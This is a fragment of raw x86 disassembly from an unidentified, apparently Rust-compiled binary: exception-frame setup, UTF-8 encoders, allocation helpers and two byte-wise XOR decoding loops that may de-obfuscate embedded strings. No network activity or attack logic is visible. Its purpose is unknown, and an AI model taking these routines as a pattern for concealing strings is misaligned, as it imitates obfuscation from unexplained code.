  4044da:	68 b7 19 40 00       	push   $0x4019b7
  4044df:	e8 32 12 00 00       	call   0x405716
  4044e4:	83 c4 10             	add    $0x10,%esp
  4044e7:	c3                   	ret
  4044e8:	cc                   	int3
  4044e9:	cc                   	int3
  4044ea:	cc                   	int3
  4044eb:	cc                   	int3
  4044ec:	cc                   	int3
  4044ed:	cc                   	int3
  4044ee:	cc                   	int3
  4044ef:	cc                   	int3
  4044f0:	b8 b8 ee 92 00       	mov    $0x92eeb8,%eax
  4044f5:	e9 ee 8c 01 00       	jmp    0x41d1e8
  4044fa:	cc                   	int3
  4044fb:	cc                   	int3
  4044fc:	cc                   	int3
  4044fd:	cc                   	int3
  4044fe:	cc                   	int3
  4044ff:	cc                   	int3
  404500:	b8 e4 ee 92 00       	mov    $0x92eee4,%eax
  404505:	e9 de 8c 01 00       	jmp    0x41d1e8
  40450a:	cc                   	int3
  40450b:	cc                   	int3
  40450c:	cc                   	int3
  40450d:	cc                   	int3
  40450e:	cc                   	int3
  40450f:	cc                   	int3
  404510:	b8 10 ef 92 00       	mov    $0x92ef10,%eax
  404515:	e9 ce 8c 01 00       	jmp    0x41d1e8
  40451a:	cc                   	int3
  40451b:	cc                   	int3
  40451c:	cc                   	int3
  40451d:	cc                   	int3
  40451e:	cc                   	int3
  40451f:	cc                   	int3
  404520:	b8 c4 ef 92 00       	mov    $0x92efc4,%eax
  404525:	e9 be 8c 01 00       	jmp    0x41d1e8
  40452a:	cc                   	int3
  40452b:	cc                   	int3
  40452c:	cc                   	int3
  40452d:	cc                   	int3
  40452e:	cc                   	int3
  40452f:	cc                   	int3
  404530:	b8 f0 ef 92 00       	mov    $0x92eff0,%eax
  404535:	e9 ae 8c 01 00       	jmp    0x41d1e8
  40453a:	cc                   	int3
  40453b:	cc                   	int3
  40453c:	cc                   	int3
  40453d:	cc                   	int3
  40453e:	cc                   	int3
  40453f:	cc                   	int3
  404540:	b8 1c f0 92 00       	mov    $0x92f01c,%eax
  404545:	e9 9e 8c 01 00       	jmp    0x41d1e8
  40454a:	cc                   	int3
  40454b:	cc                   	int3
  40454c:	cc                   	int3
  40454d:	cc                   	int3
  40454e:	cc                   	int3
  40454f:	cc                   	int3
  404550:	b8 48 f0 92 00       	mov    $0x92f048,%eax
  404555:	e9 8e 8c 01 00       	jmp    0x41d1e8
  40455a:	cc                   	int3
  40455b:	cc                   	int3
  40455c:	53                   	push   %ebx
  40455d:	57                   	push   %edi
  40455e:	56                   	push   %esi
  40455f:	8b 7c 24 18          	mov    0x18(%esp),%edi
  404563:	8b 54 24 14          	mov    0x14(%esp),%edx
  404567:	8b 74 24 10          	mov    0x10(%esp),%esi
  40456b:	8b 07                	mov    (%edi),%eax
  40456d:	8b 4f 04             	mov    0x4(%edi),%ecx
  404570:	39 d6                	cmp    %edx,%esi
  404572:	74 12                	je     0x404586
  404574:	8b 7f 08             	mov    0x8(%edi),%edi
  404577:	29 f2                	sub    %esi,%edx
  404579:	8a 1e                	mov    (%esi),%bl
  40457b:	46                   	inc    %esi
  40457c:	80 f3 ea             	xor    $0xea,%bl
  40457f:	88 1c 0f             	mov    %bl,(%edi,%ecx,1)
  404582:	41                   	inc    %ecx
  404583:	4a                   	dec    %edx
  404584:	75 f3                	jne    0x404579
  404586:	89 08                	mov    %ecx,(%eax)
  404588:	5e                   	pop    %esi
  404589:	5f                   	pop    %edi
  40458a:	5b                   	pop    %ebx
  40458b:	c3                   	ret
  40458c:	53                   	push   %ebx
  40458d:	57                   	push   %edi
  40458e:	56                   	push   %esi
  40458f:	8b 7c 24 18          	mov    0x18(%esp),%edi
  404593:	8b 54 24 14          	mov    0x14(%esp),%edx
  404597:	8b 74 24 10          	mov    0x10(%esp),%esi
  40459b:	8b 07                	mov    (%edi),%eax
  40459d:	8b 4f 04             	mov    0x4(%edi),%ecx
  4045a0:	39 d6                	cmp    %edx,%esi
  4045a2:	74 12                	je     0x4045b6
  4045a4:	8b 7f 08             	mov    0x8(%edi),%edi
  4045a7:	29 f2                	sub    %esi,%edx
  4045a9:	8a 1e                	mov    (%esi),%bl
  4045ab:	46                   	inc    %esi
  4045ac:	80 f3 2e             	xor    $0x2e,%bl
  4045af:	88 1c 0f             	mov    %bl,(%edi,%ecx,1)
  4045b2:	41                   	inc    %ecx
  4045b3:	4a                   	dec    %edx
  4045b4:	75 f3                	jne    0x4045a9
  4045b6:	89 08                	mov    %ecx,(%eax)
  4045b8:	5e                   	pop    %esi
  4045b9:	5f                   	pop    %edi
  4045ba:	5b                   	pop    %ebx
  4045bb:	c3                   	ret
  4045bc:	53                   	push   %ebx
  4045bd:	57                   	push   %edi
  4045be:	56                   	push   %esi
  4045bf:	8b 74 24 18          	mov    0x18(%esp),%esi
  4045c3:	8a 54 24 14          	mov    0x14(%esp),%dl
  4045c7:	8a 74 24 10          	mov    0x10(%esp),%dh
  4045cb:	8b 06                	mov    (%esi),%eax
  4045cd:	8b 4e 04             	mov    0x4(%esi),%ecx
  4045d0:	38 d6                	cmp    %dl,%dh
  4045d2:	73 16                	jae    0x4045ea
  4045d4:	8b 76 08             	mov    0x8(%esi),%esi
  4045d7:	0f b6 fe             	movzbl %dh,%edi
  4045da:	8d 1c bf             	lea    (%edi,%edi,4),%ebx
  4045dd:	fe c6                	inc    %dh
  4045df:	88 1c 0e             	mov    %bl,(%esi,%ecx,1)
  4045e2:	41                   	inc    %ecx
  4045e3:	80 c3 05             	add    $0x5,%bl
  4045e6:	38 d6                	cmp    %dl,%dh
  4045e8:	72 f3                	jb     0x4045dd
  4045ea:	89 08                	mov    %ecx,(%eax)
  4045ec:	5e                   	pop    %esi
  4045ed:	5f                   	pop    %edi
  4045ee:	5b                   	pop    %ebx
  4045ef:	c3                   	ret
  4045f0:	55                   	push   %ebp
  4045f1:	89 e5                	mov    %esp,%ebp
  4045f3:	53                   	push   %ebx
  4045f4:	57                   	push   %edi
  4045f5:	56                   	push   %esi
  4045f6:	83 ec 34             	sub    $0x34,%esp
  4045f9:	8d 45 e8             	lea    -0x18(%ebp),%eax
  4045fc:	8b 75 08             	mov    0x8(%ebp),%esi
  4045ff:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  404602:	89 60 fc             	mov    %esp,-0x4(%eax)
  404605:	c7 40 08 ff ff ff ff 	movl   $0xffffffff,0x8(%eax)
  40460c:	c7 40 04 f0 4c 40 00 	movl   $0x404cf0,0x4(%eax)
  404613:	64 8b 15 00 00 00 00 	mov    %fs:0x0,%edx
  40461a:	89 10                	mov    %edx,(%eax)
  40461c:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  404622:	c6 06 04             	movb   $0x4,(%esi)
  404625:	c7 40 08 00 00 00 00 	movl   $0x0,0x8(%eax)
  40462c:	8b 45 10             	mov    0x10(%ebp),%eax
  40462f:	8d 55 d8             	lea    -0x28(%ebp),%edx
  404632:	8b 7e 04             	mov    0x4(%esi),%edi
  404635:	8b 36                	mov    (%esi),%esi
  404637:	89 4a 08             	mov    %ecx,0x8(%edx)
  40463a:	89 7a 04             	mov    %edi,0x4(%edx)
  40463d:	89 32                	mov    %esi,(%edx)
  40463f:	50                   	push   %eax
  404640:	68 74 5c 92 00       	push   $0x925c74
  404645:	52                   	push   %edx
  404646:	e8 85 4f 01 00       	call   0x4195d0
  40464b:	83 c4 0c             	add    $0xc,%esp
  40464e:	8a 4d d8             	mov    -0x28(%ebp),%cl
  404651:	84 c0                	test   %al,%al
  404653:	74 13                	je     0x404668
  404655:	8b 75 08             	mov    0x8(%ebp),%esi
  404658:	80 f9 04             	cmp    $0x4,%cl
  40465b:	74 35                	je     0x404692
  40465d:	f2 0f 10 45 d8       	movsd  -0x28(%ebp),%xmm0
  404662:	f2 0f 11 06          	movsd  %xmm0,(%esi)
  404666:	eb 17                	jmp    0x40467f
  404668:	8b 75 08             	mov    0x8(%ebp),%esi
  40466b:	80 f9 04             	cmp    $0x4,%cl
  40466e:	74 0f                	je     0x40467f
  404670:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  404673:	c7 45 f0 ff ff ff ff 	movl   $0xffffffff,-0x10(%ebp)
  40467a:	e8 b8 fb ff ff       	call   0x404237
  40467f:	8b 45 e8             	mov    -0x18(%ebp),%eax
  404682:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  404688:	89 f0                	mov    %esi,%eax
  40468a:	83 c4 34             	add    $0x34,%esp
  40468d:	5e                   	pop    %esi
  40468e:	5f                   	pop    %edi
  40468f:	5b                   	pop    %ebx
  404690:	5d                   	pop    %ebp
  404691:	c3                   	ret
  404692:	8d 45 c0             	lea    -0x40(%ebp),%eax
  404695:	31 c9                	xor    %ecx,%ecx
  404697:	c7 00 10 5c 92 00    	movl   $0x925c10,(%eax)
  40469d:	c7 40 04 01 00 00 00 	movl   $0x1,0x4(%eax)
  4046a4:	89 48 10             	mov    %ecx,0x10(%eax)
  4046a7:	c7 40 08 04 00 00 00 	movl   $0x4,0x8(%eax)
  4046ae:	89 48 0c             	mov    %ecx,0xc(%eax)
  4046b1:	68 64 5c 92 00       	push   $0x925c64
  4046b6:	50                   	push   %eax
  4046b7:	e8 94 79 02 00       	call   0x42c050
  4046bc:	83 c4 08             	add    $0x8,%esp
  4046bf:	0f 0b                	ud2
  4046c1:	55                   	push   %ebp
  4046c2:	83 ec 0c             	sub    $0xc,%esp
  4046c5:	83 c5 0c             	add    $0xc,%ebp
  4046c8:	80 7d d8 04          	cmpb   $0x4,-0x28(%ebp)
  4046cc:	74 08                	je     0x4046d6
  4046ce:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  4046d1:	e8 61 fb ff ff       	call   0x404237
  4046d6:	83 c4 0c             	add    $0xc,%esp
  4046d9:	5d                   	pop    %ebp
  4046da:	c3                   	ret
  4046db:	cc                   	int3
  4046dc:	55                   	push   %ebp
  4046dd:	53                   	push   %ebx
  4046de:	57                   	push   %edi
  4046df:	56                   	push   %esi
  4046e0:	83 ec 10             	sub    $0x10,%esp
  4046e3:	8b 6c 24 28          	mov    0x28(%esp),%ebp
  4046e7:	e8 00 00 00 00       	call   0x4046ec
  4046ec:	58                   	pop    %eax
  4046ed:	89 0c 24             	mov    %ecx,(%esp)
  4046f0:	89 44 24 0c          	mov    %eax,0xc(%esp)
  4046f4:	85 ed                	test   %ebp,%ebp
  4046f6:	74 5f                	je     0x404757
  4046f8:	8b 74 24 24          	mov    0x24(%esp),%esi
  4046fc:	89 d3                	mov    %edx,%ebx
  4046fe:	8d 7c 24 04          	lea    0x4(%esp),%edi
  404702:	55                   	push   %ebp
  404703:	56                   	push   %esi
  404704:	53                   	push   %ebx
  404705:	57                   	push   %edi
  404706:	e8 05 c9 00 00       	call   0x411010
  40470b:	83 c4 10             	add    $0x10,%esp
  40470e:	0f b6 44 24 04       	movzbl 0x4(%esp),%eax
  404713:	83 f8 04             	cmp    $0x4,%eax
  404716:	75 14                	jne    0x40472c
  404718:	8b 44 24 08          	mov    0x8(%esp),%eax
  40471c:	85 c0                	test   %eax,%eax
  40471e:	74 3f                	je     0x40475f
  404720:	89 e9                	mov    %ebp,%ecx
  404722:	29 c1                	sub    %eax,%ecx
  404724:	72 51                	jb     0x404777
  404726:	01 c6                	add    %eax,%esi
  404728:	89 cd                	mov    %ecx,%ebp
  40472a:	eb 27                	jmp    0x404753
  40472c:	8b 04 85 84 47 40 00 	mov    0x404784(,%eax,4),%eax
  404733:	03 44 24 0c          	add    0xc(%esp),%eax
  404737:	ff e0                	jmp    *%eax
  404739:	8b 44 24 08          	mov    0x8(%esp),%eax
  40473d:	80 78 08 23          	cmpb   $0x23,0x8(%eax)
  404741:	75 21                	jne    0x404764
  404743:	eb 07                	jmp    0x40474c
  404745:	80 7c 24 05 23       	cmpb   $0x23,0x5(%esp)
  40474a:	75 18                	jne    0x404764
  40474c:	89 f9                	mov    %edi,%ecx
  40474e:	e8 e4 fa ff ff       	call   0x404237
  404753:	85 ed                	test   %ebp,%ebp
  404755:	75 ab                	jne    0x404702
  404757:	8b 04 24             	mov    (%esp),%eax
  40475a:	c6 00 04             	movb   $0x4,(%eax)
  40475d:	eb 10                	jmp    0x40476f
  40475f:	bf b4 5c 92 00       	mov    $0x925cb4,%edi
  404764:	8b 04 24             	mov    (%esp),%eax
  404767:	f2 0f 10 07          	movsd  (%edi),%xmm0
  40476b:	f2 0f 11 00          	movsd  %xmm0,(%eax)
  40476f:	83 c4 10             	add    $0x10,%esp
  404772:	5e                   	pop    %esi
  404773:	5f                   	pop    %edi
  404774:	5b                   	pop    %ebx
  404775:	5d                   	pop    %ebp
  404776:	c3                   	ret
  404777:	68 bc 5c 92 00       	push   $0x925cbc
  40477c:	55                   	push   %ebp
  40477d:	55                   	push   %ebp
  40477e:	50                   	push   %eax
  40477f:	e8 3c 74 02 00       	call   0x42bbc0
  404784:	78 00                	js     0x404786
  404786:	00 00                	add    %al,(%eax)
  404788:	59                   	pop    %ecx
  404789:	00 00                	add    %al,(%eax)
  40478b:	00 4d 00             	add    %cl,0x0(%ebp)
  40478e:	00 00                	add    %al,(%eax)
  404790:	4d                   	dec    %ebp
  404791:	00 00                	add    %al,(%eax)
  404793:	00 55 89             	add    %dl,-0x77(%ebp)
  404796:	e5 53                	in     $0x53,%eax
  404798:	57                   	push   %edi
  404799:	56                   	push   %esi
  40479a:	83 ec 34             	sub    $0x34,%esp
  40479d:	8d 45 e8             	lea    -0x18(%ebp),%eax
  4047a0:	8b 75 08             	mov    0x8(%ebp),%esi
  4047a3:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  4047a6:	89 60 fc             	mov    %esp,-0x4(%eax)
  4047a9:	c7 40 08 ff ff ff ff 	movl   $0xffffffff,0x8(%eax)
  4047b0:	c7 40 04 00 4d 40 00 	movl   $0x404d00,0x4(%eax)
  4047b7:	64 8b 15 00 00 00 00 	mov    %fs:0x0,%edx
  4047be:	89 10                	mov    %edx,(%eax)
  4047c0:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  4047c6:	c6 06 04             	movb   $0x4,(%esi)
  4047c9:	c7 40 08 00 00 00 00 	movl   $0x0,0x8(%eax)
  4047d0:	8b 45 10             	mov    0x10(%ebp),%eax
  4047d3:	8d 55 d8             	lea    -0x28(%ebp),%edx
  4047d6:	8b 7e 04             	mov    0x4(%esi),%edi
  4047d9:	8b 36                	mov    (%esi),%esi
  4047db:	89 4a 08             	mov    %ecx,0x8(%edx)
  4047de:	89 7a 04             	mov    %edi,0x4(%edx)
  4047e1:	89 32                	mov    %esi,(%edx)
  4047e3:	50                   	push   %eax
  4047e4:	68 a0 5b 92 00       	push   $0x925ba0
  4047e9:	52                   	push   %edx
  4047ea:	e8 e1 4d 01 00       	call   0x4195d0
  4047ef:	83 c4 0c             	add    $0xc,%esp
  4047f2:	8a 4d d8             	mov    -0x28(%ebp),%cl
  4047f5:	84 c0                	test   %al,%al
  4047f7:	74 13                	je     0x40480c
  4047f9:	8b 75 08             	mov    0x8(%ebp),%esi
  4047fc:	80 f9 04             	cmp    $0x4,%cl
  4047ff:	74 35                	je     0x404836
  404801:	f2 0f 10 45 d8       	movsd  -0x28(%ebp),%xmm0
  404806:	f2 0f 11 06          	movsd  %xmm0,(%esi)
  40480a:	eb 17                	jmp    0x404823
  40480c:	8b 75 08             	mov    0x8(%ebp),%esi
  40480f:	80 f9 04             	cmp    $0x4,%cl
  404812:	74 0f                	je     0x404823
  404814:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  404817:	c7 45 f0 ff ff ff ff 	movl   $0xffffffff,-0x10(%ebp)
  40481e:	e8 14 fa ff ff       	call   0x404237
  404823:	8b 45 e8             	mov    -0x18(%ebp),%eax
  404826:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  40482c:	89 f0                	mov    %esi,%eax
  40482e:	83 c4 34             	add    $0x34,%esp
  404831:	5e                   	pop    %esi
  404832:	5f                   	pop    %edi
  404833:	5b                   	pop    %ebx
  404834:	5d                   	pop    %ebp
  404835:	c3                   	ret
  404836:	8d 45 c0             	lea    -0x40(%ebp),%eax
  404839:	31 c9                	xor    %ecx,%ecx
  40483b:	c7 00 10 5c 92 00    	movl   $0x925c10,(%eax)
  404841:	c7 40 04 01 00 00 00 	movl   $0x1,0x4(%eax)
  404848:	89 48 10             	mov    %ecx,0x10(%eax)
  40484b:	c7 40 08 04 00 00 00 	movl   $0x4,0x8(%eax)
  404852:	89 48 0c             	mov    %ecx,0xc(%eax)
  404855:	68 64 5c 92 00       	push   $0x925c64
  40485a:	50                   	push   %eax
  40485b:	e8 f0 77 02 00       	call   0x42c050
  404860:	83 c4 08             	add    $0x8,%esp
  404863:	0f 0b                	ud2
  404865:	55                   	push   %ebp
  404866:	83 ec 0c             	sub    $0xc,%esp
  404869:	83 c5 0c             	add    $0xc,%ebp
  40486c:	80 7d d8 04          	cmpb   $0x4,-0x28(%ebp)
  404870:	74 08                	je     0x40487a
  404872:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  404875:	e8 bd f9 ff ff       	call   0x404237
  40487a:	83 c4 0c             	add    $0xc,%esp
  40487d:	5d                   	pop    %ebp
  40487e:	c3                   	ret
  40487f:	53                   	push   %ebx
  404880:	56                   	push   %esi
  404881:	50                   	push   %eax
  404882:	8b 54 24 14          	mov    0x14(%esp),%edx
  404886:	8b 74 24 10          	mov    0x10(%esp),%esi
  40488a:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  404891:	81 fa 80 00 00 00    	cmp    $0x80,%edx
  404897:	73 08                	jae    0x4048a1
  404899:	31 c0                	xor    %eax,%eax
  40489b:	88 14 24             	mov    %dl,(%esp)
  40489e:	40                   	inc    %eax
  40489f:	eb 6b                	jmp    0x40490c
  4048a1:	89 d1                	mov    %edx,%ecx
  4048a3:	89 d3                	mov    %edx,%ebx
  4048a5:	80 e1 3f             	and    $0x3f,%cl
  4048a8:	c1 eb 06             	shr    $0x6,%ebx
  4048ab:	80 c9 80             	or     $0x80,%cl
  4048ae:	81 fa 00 08 00 00    	cmp    $0x800,%edx
  4048b4:	73 11                	jae    0x4048c7
  4048b6:	80 cb c0             	or     $0xc0,%bl
  4048b9:	b8 02 00 00 00       	mov    $0x2,%eax
  4048be:	88 1c 24             	mov    %bl,(%esp)
  4048c1:	88 4c 24 01          	mov    %cl,0x1(%esp)
  4048c5:	eb 45                	jmp    0x40490c
  4048c7:	80 e3 3f             	and    $0x3f,%bl
  4048ca:	89 d0                	mov    %edx,%eax
  4048cc:	80 cb 80             	or     $0x80,%bl
  4048cf:	c1 e8 0c             	shr    $0xc,%eax
  4048d2:	81 fa ff ff 00 00    	cmp    $0xffff,%edx
  4048d8:	77 14                	ja     0x4048ee
  4048da:	0c e0                	or     $0xe0,%al
  4048dc:	88 04 24             	mov    %al,(%esp)
  4048df:	88 5c 24 01          	mov    %bl,0x1(%esp)
  4048e3:	88 4c 24 02          	mov    %cl,0x2(%esp)
  4048e7:	b8 03 00 00 00       	mov    $0x3,%eax
  4048ec:	eb 1e                	jmp    0x40490c
  4048ee:	24 3f                	and    $0x3f,%al
  4048f0:	c1 ea 12             	shr    $0x12,%edx
  4048f3:	80 ca f0             	or     $0xf0,%dl
  4048f6:	0c 80                	or     $0x80,%al
  4048f8:	88 14 24             	mov    %dl,(%esp)
  4048fb:	88 44 24 01          	mov    %al,0x1(%esp)
  4048ff:	b8 04 00 00 00       	mov    $0x4,%eax
  404904:	88 5c 24 02          	mov    %bl,0x2(%esp)
  404908:	88 4c 24 03          	mov    %cl,0x3(%esp)
  40490c:	89 e1                	mov    %esp,%ecx
  40490e:	50                   	push   %eax
  40490f:	51                   	push   %ecx
  404910:	56                   	push   %esi
  404911:	e8 88 02 00 00       	call   0x404b9e
  404916:	83 c4 10             	add    $0x10,%esp
  404919:	5e                   	pop    %esi
  40491a:	5b                   	pop    %ebx
  40491b:	c3                   	ret
  40491c:	53                   	push   %ebx
  40491d:	56                   	push   %esi
  40491e:	50                   	push   %eax
  40491f:	8b 54 24 14          	mov    0x14(%esp),%edx
  404923:	8b 74 24 10          	mov    0x10(%esp),%esi
  404927:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  40492e:	81 fa 80 00 00 00    	cmp    $0x80,%edx
  404934:	73 08                	jae    0x40493e
  404936:	31 c0                	xor    %eax,%eax
  404938:	88 14 24             	mov    %dl,(%esp)
  40493b:	40                   	inc    %eax
  40493c:	eb 6b                	jmp    0x4049a9
  40493e:	89 d1                	mov    %edx,%ecx
  404940:	89 d3                	mov    %edx,%ebx
  404942:	80 e1 3f             	and    $0x3f,%cl
  404945:	c1 eb 06             	shr    $0x6,%ebx
  404948:	80 c9 80             	or     $0x80,%cl
  40494b:	81 fa 00 08 00 00    	cmp    $0x800,%edx
  404951:	73 11                	jae    0x404964
  404953:	80 cb c0             	or     $0xc0,%bl
  404956:	b8 02 00 00 00       	mov    $0x2,%eax
  40495b:	88 1c 24             	mov    %bl,(%esp)
  40495e:	88 4c 24 01          	mov    %cl,0x1(%esp)
  404962:	eb 45                	jmp    0x4049a9
  404964:	80 e3 3f             	and    $0x3f,%bl
  404967:	89 d0                	mov    %edx,%eax
  404969:	80 cb 80             	or     $0x80,%bl
  40496c:	c1 e8 0c             	shr    $0xc,%eax
  40496f:	81 fa ff ff 00 00    	cmp    $0xffff,%edx
  404975:	77 14                	ja     0x40498b
  404977:	0c e0                	or     $0xe0,%al
  404979:	88 04 24             	mov    %al,(%esp)
  40497c:	88 5c 24 01          	mov    %bl,0x1(%esp)
  404980:	88 4c 24 02          	mov    %cl,0x2(%esp)
  404984:	b8 03 00 00 00       	mov    $0x3,%eax
  404989:	eb 1e                	jmp    0x4049a9
  40498b:	24 3f                	and    $0x3f,%al
  40498d:	c1 ea 12             	shr    $0x12,%edx
  404990:	80 ca f0             	or     $0xf0,%dl
  404993:	0c 80                	or     $0x80,%al
  404995:	88 14 24             	mov    %dl,(%esp)
  404998:	88 44 24 01          	mov    %al,0x1(%esp)
  40499c:	b8 04 00 00 00       	mov    $0x4,%eax
  4049a1:	88 5c 24 02          	mov    %bl,0x2(%esp)
  4049a5:	88 4c 24 03          	mov    %cl,0x3(%esp)
  4049a9:	89 e1                	mov    %esp,%ecx
  4049ab:	50                   	push   %eax
  4049ac:	51                   	push   %ecx
  4049ad:	56                   	push   %esi
  4049ae:	e8 90 02 00 00       	call   0x404c43
  4049b3:	83 c4 10             	add    $0x10,%esp
  4049b6:	5e                   	pop    %esi
  4049b7:	5b                   	pop    %ebx
  4049b8:	c3                   	ret
  4049b9:	ff 74 24 08          	push   0x8(%esp)
  4049bd:	68 a0 5b 92 00       	push   $0x925ba0
  4049c2:	ff 74 24 0c          	push   0xc(%esp)
  4049c6:	e8 05 4c 01 00       	call   0x4195d0
  4049cb:	83 c4 0c             	add    $0xc,%esp
  4049ce:	c3                   	ret
  4049cf:	ff 74 24 08          	push   0x8(%esp)
  4049d3:	68 74 5c 92 00       	push   $0x925c74
  4049d8:	ff 74 24 0c          	push   0xc(%esp)
  4049dc:	e8 ef 4b 01 00       	call   0x4195d0
  4049e1:	83 c4 0c             	add    $0xc,%esp
  4049e4:	c3                   	ret
  4049e5:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  4049e9:	80 39 04             	cmpb   $0x4,(%ecx)
  4049ec:	0f 85 45 f8 ff ff    	jne    0x404237
  4049f2:	c3                   	ret
  4049f3:	56                   	push   %esi
  4049f4:	83 ec 08             	sub    $0x8,%esp
  4049f7:	8b 31                	mov    (%ecx),%esi
  4049f9:	85 f6                	test   %esi,%esi
  4049fb:	74 11                	je     0x404a0e
  4049fd:	8b 41 04             	mov    0x4(%ecx),%eax
  404a00:	0f af 74 24 10       	imul   0x10(%esp),%esi
  404a05:	8d 4c 24 04          	lea    0x4(%esp),%ecx
  404a09:	89 14 24             	mov    %edx,(%esp)
  404a0c:	eb 04                	jmp    0x404a12
  404a0e:	31 f6                	xor    %esi,%esi
  404a10:	89 e1                	mov    %esp,%ecx
  404a12:	89 31                	mov    %esi,(%ecx)
  404a14:	8b 0c 24             	mov    (%esp),%ecx
  404a17:	85 c9                	test   %ecx,%ecx
  404a19:	74 15                	je     0x404a30
  404a1b:	8b 54 24 04          	mov    0x4(%esp),%edx
  404a1f:	85 d2                	test   %edx,%edx
  404a21:	74 0d                	je     0x404a30
  404a23:	51                   	push   %ecx
  404a24:	52                   	push   %edx
  404a25:	50                   	push   %eax
  404a26:	e8 4e 1e 00 00       	call   0x406879
  404a2b:	83 c4 14             	add    $0x14,%esp
  404a2e:	eb 03                	jmp    0x404a33
  404a30:	83 c4 08             	add    $0x8,%esp
  404a33:	5e                   	pop    %esi
  404a34:	c3                   	ret
  404a35:	55                   	push   %ebp
  404a36:	53                   	push   %ebx
  404a37:	57                   	push   %edi
  404a38:	56                   	push   %esi
  404a39:	8b 5c 24 20          	mov    0x20(%esp),%ebx
  404a3d:	8b 44 24 24          	mov    0x24(%esp),%eax
  404a41:	8b 6c 24 18          	mov    0x18(%esp),%ebp
  404a45:	8b 74 24 14          	mov    0x14(%esp),%esi
  404a49:	8d 4c 03 ff          	lea    -0x1(%ebx,%eax,1),%ecx
  404a4d:	89 d8                	mov    %ebx,%eax
  404a4f:	f7 d8                	neg    %eax
  404a51:	21 c8                	and    %ecx,%eax
  404a53:	b9 00 00 00 80       	mov    $0x80000000,%ecx
  404a58:	f7 e5                	mul    %ebp
  404a5a:	0f 90 c2             	seto   %dl
  404a5d:	89 c7                	mov    %eax,%edi
  404a5f:	29 d9                	sub    %ebx,%ecx
  404a61:	39 cf                	cmp    %ecx,%edi
  404a63:	0f 97 c1             	seta   %cl
  404a66:	08 d1                	or     %dl,%cl
  404a68:	80 f9 01             	cmp    $0x1,%cl
  404a6b:	75 0c                	jne    0x404a79
  404a6d:	31 c0                	xor    %eax,%eax
  404a6f:	c7 46 04 00 00 00 00 	movl   $0x0,0x4(%esi)
  404a76:	40                   	inc    %eax
  404a77:	eb 3b                	jmp    0x404ab4
  404a79:	85 ff                	test   %edi,%edi
  404a7b:	74 15                	je     0x404a92
  404a7d:	e8 1f 07 00 00       	call   0x4051a1
  404a82:	80 7c 24 1c 00       	cmpb   $0x0,0x1c(%esp)
  404a87:	74 15                	je     0x404a9e
  404a89:	53                   	push   %ebx
  404a8a:	57                   	push   %edi
  404a8b:	e8 0f 1e 00 00       	call   0x40689f
  404a90:	eb 13                	jmp    0x404aa5
  404a92:	c7 46 04 00 00 00 00 	movl   $0x0,0x4(%esi)
  404a99:	89 5e 08             	mov    %ebx,0x8(%esi)
  404a9c:	eb 14                	jmp    0x404ab2
  404a9e:	53                   	push   %ebx
  404a9f:	57                   	push   %edi
  404aa0:	e8 c7 1d 00 00       	call   0x40686c
  404aa5:	83 c4 08             	add    $0x8,%esp
  404aa8:	85 c0                	test   %eax,%eax
  404aaa:	74 11                	je     0x404abd
  404aac:	89 6e 04             	mov    %ebp,0x4(%esi)
  404aaf:	89 46 08             	mov    %eax,0x8(%esi)
  404ab2:	31 c0                	xor    %eax,%eax
  404ab4:	89 06                	mov    %eax,(%esi)
  404ab6:	89 f0                	mov    %esi,%eax
  404ab8:	5e                   	pop    %esi
  404ab9:	5f                   	pop    %edi
  404aba:	5b                   	pop    %ebx
  404abb:	5d                   	pop    %ebp
  404abc:	c3                   	ret
  404abd:	31 c0                	xor    %eax,%eax
  404abf:	89 5e 04             	mov    %ebx,0x4(%esi)
  404ac2:	89 7e 08             	mov    %edi,0x8(%esi)
  404ac5:	eb af                	jmp    0x404a76
  404ac7:	55                   	push   %ebp
  404ac8:	53                   	push   %ebx
  404ac9:	57                   	push   %edi
  404aca:	56                   	push   %esi
  404acb:	83 ec 08             	sub    $0x8,%esp
  404ace:	8b 4c 24 28          	mov    0x28(%esp),%ecx
  404ad2:	8b 7c 24 24          	mov    0x24(%esp),%edi
  404ad6:	8b 5c 24 1c          	mov    0x1c(%esp),%ebx
  404ada:	31 f6                	xor    %esi,%esi
  404adc:	89 e2                	mov    %esp,%edx
  404ade:	85 c9                	test   %ecx,%ecx
  404ae0:	74 17                	je     0x404af9
  404ae2:	8b 2b                	mov    (%ebx),%ebp
  404ae4:	85 ed                	test   %ebp,%ebp
  404ae6:	74 11                	je     0x404af9
  404ae8:	8b 43 04             	mov    0x4(%ebx),%eax
  404aeb:	0f af e9             	imul   %ecx,%ebp
  404aee:	8d 54 24 04          	lea    0x4(%esp),%edx
  404af2:	89 3c 24             	mov    %edi,(%esp)
  404af5:	89 ee                	mov    %ebp,%esi
  404af7:	eb 00                	jmp    0x404af9
  404af9:	89 32                	mov    %esi,(%edx)
  404afb:	8b 34 24             	mov    (%esp),%esi
  404afe:	85 f6                	test   %esi,%esi
  404b00:	74 51                	je     0x404b53
  404b02:	8b 6c 24 20          	mov    0x20(%esp),%ebp
  404b06:	8b 54 24 04          	mov    0x4(%esp),%edx
  404b0a:	85 ed                	test   %ebp,%ebp
  404b0c:	74 17                	je     0x404b25
  404b0e:	89 cf                	mov    %ecx,%edi
  404b10:	0f af fd             	imul   %ebp,%edi
  404b13:	85 c9                	test   %ecx,%ecx
  404b15:	74 22                	je     0x404b39
  404b17:	57                   	push   %edi
  404b18:	56                   	push   %esi
  404b19:	52                   	push   %edx
  404b1a:	50                   	push   %eax
  404b1b:	e8 6a 1d 00 00       	call   0x40688a
  404b20:	83 c4 10             	add    $0x10,%esp
  404b23:	eb 25                	jmp    0x404b4a
  404b25:	85 d2                	test   %edx,%edx
  404b27:	74 0b                	je     0x404b34
  404b29:	56                   	push   %esi
  404b2a:	52                   	push   %edx
  404b2b:	50                   	push   %eax
  404b2c:	e8 48 1d 00 00       	call   0x406879
  404b31:	83 c4 0c             	add    $0xc,%esp
  404b34:	89 7b 04             	mov    %edi,0x4(%ebx)
